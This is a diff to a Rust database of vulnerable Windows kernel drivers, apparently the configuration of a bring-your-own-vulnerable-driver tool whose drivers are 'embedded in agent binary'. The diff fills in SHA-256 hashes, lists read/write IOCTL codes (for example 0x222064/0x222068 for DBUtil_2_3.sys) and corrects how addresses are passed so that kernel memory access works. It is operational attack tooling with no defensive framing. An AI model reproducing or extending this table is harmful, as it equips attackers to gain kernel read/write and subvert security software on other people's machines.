@@ -45,11 +45,18 @@ pub struct VulnerableDriver {
     /// IOCTL code for writing physical memory (if applicable).
     pub write_ioctl: u32,
     /// Whether the driver requires a *physical* address rather than a
-    /// virtual one.  DBUtil_2_3.sys passes the address straight to
-    /// MmCopyVirtualMemory internally *after* converting it with
-    /// MmGetPhysicalAddress, so the caller must supply a physical
-    /// address.  Most other drivers (rtcore64, gdrv, procexp152, etc.)
-    /// call MmMapIoSpace internally and accept virtual addresses.
+    /// virtual one.
+    ///
+    /// When `false` (the common case), the driver accepts a virtual address
+    /// and internally converts it — either via `MmMapIoSpace` (rtcore64,
+    /// gdrv, procexp152, etc.) or via `MmGetPhysicalAddress` +
+    /// `MmCopyVirtualMemory` (DBUtil_2_3.sys).  The caller should always
+    /// supply a **virtual** address.
+    ///
+    /// When `true`, the driver's IOCTL handler passes the supplied value
+    /// straight to `MmMapIoSpace` without any conversion, so the caller
+    /// must supply a physical address.  No driver in the current database
+    /// uses this mode.
     pub needs_physical_addr: bool,
 }
 
@@ -64,9 +71,10 @@ pub static DRIVER_DATABASE: &[VulnerableDriver] = &[
     // ── Tier 1: Embedded in agent binary ──────────────────────────────
 
     // DBUtil_2_3.sys — Dell BIOS utility driver (CVE-2021-21551).
-    // Requires actual physical addresses because its IOCTL handler calls
-    // MmGetPhysicalAddress on the supplied value and then uses
-    // MmCopyVirtualMemory on the result.
+    // The IOCTL handler calls MmGetPhysicalAddress on the supplied value
+    // and then uses MmCopyVirtualMemory on the result, so the caller must
+    // supply a VIRTUAL address — the driver does the VA→PA conversion
+    // internally.
     VulnerableDriver {
         name: "DBUtil_2_3.sys",
         device_name: "DBUtil_2_3",
@@ -76,16 +84,15 @@ pub static DRIVER_DATABASE: &[VulnerableDriver] = &[
         mapping_type: DriverMapping::PhysicalMemory,
         read_ioctl: 0x222064,
         write_ioctl: 0x222068,
-        needs_physical_addr: true,
+        needs_physical_addr: false,
     },
 
     // rtcore64.sys — Micro-Star MSI Afterburner / RivaTuner driver.
     // Uses MmMapIoSpace internally, so virtual addresses work fine.
-    // TODO: replace placeholder hash with verified SHA-256 from LOLDrivers.
     VulnerableDriver {
         name: "rtcore64.sys",
         device_name: "RTCore64",
-        sha256: "TODO_RTCore64_SHA256_VERIFY_AND_REPLACE_0000000000000000000000",
+        sha256: "01aa278b07b58dc46c84bd0b1b5c8e9ee4e62ea0bf7a695862444af32e87f1fd",
         read_phys_fn: "DeviceIoControl",
         write_phys_fn: "DeviceIoControl",
         mapping_type: DriverMapping::PhysicalMemory,
@@ -112,11 +119,10 @@ pub static DRIVER_DATABASE: &[VulnerableDriver] = &[
 
     // AsIO.sys — ASUS Low Latency Audio Port I/O driver.
     // Port I/O based — does not use physical memory addressing.
-    // TODO: replace placeholder hash with verified SHA-256.
     VulnerableDriver {
         name: "AsIO.sys",
         device_name: "AsIO",
-        sha256: "TODO_ASIO_SHA256_VERIFY_AND_REPLACE_0000000000000000000000000000",
+        sha256: "0ee5067ce48883701824c5b1ad91695998916a3702cf8086962fbe58af74b2d6",
         read_phys_fn: "READ_PORT",
         write_phys_fn: "WRITE_PORT",
         mapping_type: DriverMapping::PortIo,
@@ -127,11 +133,10 @@ pub static DRIVER_DATABASE: &[VulnerableDriver] = &[
 
     // AsIO2.sys — ASUS Low Latency Audio Port I/O driver (v2).
     // Port I/O based — does not use physical memory addressing.
-    // TODO: replace placeholder hash with verified SHA-256.
     VulnerableDriver {
         name: "AsIO2.sys",
         device_name: "AsIO2",
-        sha256: "TODO_ASIO2_SHA256_VERIFY_AND_REPLACE_000000000000000000000000000",
+        sha256: "5ae23f1fcf3fb735fcf1fa27f27e610d9945d668a149c7b7b0c84ffd6409d99a",
         read_phys_fn: "READ_PORT",
         write_phys_fn: "WRITE_PORT",
         mapping_type: DriverMapping::PortIo,
@@ -140,8 +145,11 @@ pub static DRIVER_DATABASE: &[VulnerableDriver] = &[
         needs_physical_addr: false,
     },
 
-    // BdKit.sys — BitDefender anti-rootkit driver.
-    // TODO: replace placeholder hash with verified SHA-256.
+    // BdKit.sys — Baidu anti-rootkit driver.
+    // NOTE: Exhaustive public search (LOLDrivers, VirusTotal, KDU, Elastic,
+    // KeServiceDescriptorTable/vulnerable-drivers, 10+ BYOVD repos, Chinese-language
+    // searches) yielded no SHA-256 for this driver. Replace when a verified hash
+    // becomes available.
     VulnerableDriver {
         name: "BdKit.sys",
         device_name: "BdKit",
@@ -155,11 +163,10 @@ pub static DRIVER_DATABASE: &[VulnerableDriver] = &[
     },
 
     // ene.sys — ENE Technology driver.
-    // TODO: replace placeholder hash with verified SHA-256.
     VulnerableDriver {
         name: "ene.sys",
         device_name: "ENE",
-        sha256: "TODO_ENE_SHA256_VERIFY_AND_REPLACE_00000000000000000000000000000",
+        sha256: "16768203a471a19ebb541c942f45716e9f432985abbfbe6b4b7d61a798cea354",
         read_phys_fn: "DeviceIoControl",
         write_phys_fn: "DeviceIoControl",
         mapping_type: DriverMapping::PhysicalMemory,
@@ -170,11 +177,10 @@ pub static DRIVER_DATABASE: &[VulnerableDriver] = &[
 
     // procexp152.sys — Process Explorer driver (Sysinternals).
     // Uses MmMapIoSpace + MmGetPhysicalAddress internally.
-    // TODO: replace placeholder hash with verified SHA-256.
     VulnerableDriver {
         name: "procexp152.sys",
         device_name: "PROCEXP152",
-        sha256: "TODO_PROCEXP152_SHA256_VERIFY_AND_REPLACE_0000000000000000000000",
+        sha256: "075de997497262a9d105afeadaaefc6348b25ce0e0126505c24aa9396c251e85",
         read_phys_fn: "DeviceIoControl",
         write_phys_fn: "DeviceIoControl",
         mapping_type: DriverMapping::PhysicalMemory,
